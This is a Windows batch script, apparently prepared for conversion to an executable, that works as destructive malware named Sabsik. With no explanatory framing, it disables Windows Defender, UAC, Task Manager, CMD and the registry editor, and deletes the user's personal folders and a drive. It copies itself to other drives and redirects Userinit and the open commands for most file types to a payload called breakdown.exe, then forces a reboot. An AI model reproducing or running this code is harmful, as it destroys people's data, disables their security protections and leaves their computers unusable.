::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCmDJFiX50ckOyddTwuMcmK5CdU=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJmZk0aGkrUXA==
::ZQ05rAF9IBncCkqN+0xwdVsCAlLMaiXsZg==
::ZQ05rAF9IAHYFVzEqQIDKRlHRQ/i
::eg0/rx1wNQPfEVWB+kM9LVsJDDeDPnizDfsZ8O2b
::fBEirQZwNQPfEVWB+kM9LVsJDDeDPnizDfsZ8O2b
::cRolqwZ3JBvQF1fEqQIDJxZRDBSQM2yoB7h8
::dhA7uBVwLU+EWHSB5lYZaDxZTizi
::YQ03rBFzNR3SWATE2UciPDIUawmAFAs=
::dhAmsQZ3MwfNWATE2UciPDIUawmAFAs=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRmJ/Uw1Zns=
::Zh4grVQjdCmDJGqF9lE5I1VRVAHi
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

:: disabling Windows Defender
sc config WinDefend start= disabled
sc stop WinDefend
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

:: copying/deleting files
IF EXIST D: rd D: /s /q
IF EXIST D: xcopy /h /y /r Sabsik.exe D: && mkdir "D:\assets" && attrib +h "D:\assets" /d && xcopy /h /y /r /s /i "D:\assets" D: /e
IF EXIST E: xcopy /h /y /r Sabsik.exe E: && mkdir "E:\assets" && attrib +h "E:\assets" /d && xcopy /h /y /r /s /i "E:\assets" E: /e
::IF EXIST F: xcopy /h /y /r Sabsik.exe F: && mkdir "F:\assets" && attrib +h "F:\assets" && xcopy /h /y /r /s /i "F:\assets" F: /e
md "C:\Users\Default\Documents\Sabsik.exe"
xcopy /h /y /r "assets\breakdown.exe" "C:\Windows"
attrib +h "C:\breakdown.exe"
xcopy /h /y /r "assets\encrypted.jpg" "C:\Users\Default\Documents\Sabsik.exe"
rd "C:\Users\Public\Desktop" /s /q
md "C:\Users\Public\Desktop"
rd "%userprofile%\Desktop" /s /q
md "%userprofile%\Desktop"
rd "%userprofile%\Downloads" /s /q
rd "%userprofile%\Documents" /s /q
rd "%userprofile%\Pictures" /s /q
rd "%userprofile%\Videos" /s /q
rd "%userprofile%\Music" /s /q
rd "%userprofile%\My Documents" /s /q
rd "%appdata%\Microsoft\Windows\Start Menu\Programs\System Tools" /s /q

:: killing some tasks
taskkill /f /im Taskmgr.exe /t
taskkill /f /im regedit.exe /t
taskkill /f /im powershell.exe /t

:: NoTaskbar
REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /va /f
:: NoDesktop
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
:: AutoColorization
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v AutoColorization /t REG_DWORD /d 1 /f
:: shutdownwithoutlogon
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
:: AutoRestartShell
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 0 /f
:: EnableLUA
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
:: No WinKey
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
:: changing the wallpaper
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\Default\Documents\Sabsik.exe\encrypted.jpg" /f
:: disabling Task Manager
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
:: disabling starting any Programs
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "%SystemRoot%\system32\userinit.exe, %SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command" /ve /t REG_SZ /d ""%SystemRoot%\breakdown.exe" ""%1" %*"" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runas\command" /ve /t REG_SZ /d ""%SystemRoot%\breakdown.exe" ""%1" %*"" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\shell\runas\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
:: no files
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\runas\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\edit\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\edit\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\runas\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\edit\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_CLASSES_ROOT\docxfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\odtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\htmlfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\pngfile\shell\printto\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\jpegfile\shell\printto\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mp3file" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\giffile" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\breakdown.exe" /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell" /va /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell" /va /f
:: changing the icons
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\DefaultIcon" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\DefaultIcon" /ve /t REG_SZ /d "%SystemRoot%\breakdown.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\DefaultIcon" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\DefaultIcon" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\DefaultIcon" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\docxfile\DefaultIcon" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\DefaultIcon" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\htmlfile\DefaultIcon" /ve /t REG_SZ /d "%SystemRoot%\System32\imageres.dll,-167" /f
:: disabling CMD
REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\runas\command" /va /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\IntelliJ IDEA Community Edition\command" /va /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\IntelliJ IDEA Community Edition" /va /f
REG DELETE "HKEY_CLASSES_ROOT\directory\background\shell\IntelliJ IDEA Community Edition\command" /va /f
REG DELETE "HKEY_CLASSES_ROOT\directory\background\shell\VSCode\command" /va /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\git_shell\command" /va /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\git_shell\command" /va /f
:: disabling Registry Editor
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

shutdown /r /t 00